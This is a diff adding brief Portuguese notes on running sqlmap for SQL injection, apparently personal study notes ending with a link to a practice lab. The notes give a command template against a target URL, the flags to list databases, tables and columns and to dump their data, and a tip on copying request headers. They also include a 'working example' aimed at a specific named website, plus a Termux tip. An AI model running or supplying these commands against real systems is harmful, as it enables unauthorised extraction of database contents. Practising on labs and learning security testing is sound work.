@@ -1,0 +1,22 @@
+sqlmap -u "http://URLALVO/caminho?parametro=valor"
+
+- Siga os passos:
+    - `-dbs`: Lista os bancos de dados.
+    - `D NOME_BANCO --tables`: Lista as tabelas do banco.
+    - `D NOME_BANCO -T NOME_TABELA --columns`: Lista colunas da tabela.
+    - `D NOME_BANCO -T NOME_TABELA -C COLUNAS --dump`: Extrai dados das colunas.
+- Lembrar de usar copy request headers, e salvar em um txt, caso a opcao normal não funcione.
+- O exemplo que funciona:
+
+sqlmap -u "http://www.bancocn.com/cat.php?id=1" 
+--headers="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+AppleWebKit/537.36 
+(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" --dbs
+
+
+## TERMUX
+no termux colocar o python sqlmap.py antes do comando
+
+
+## Laboratorio
+https://github.com/juananpe/sqli-lab
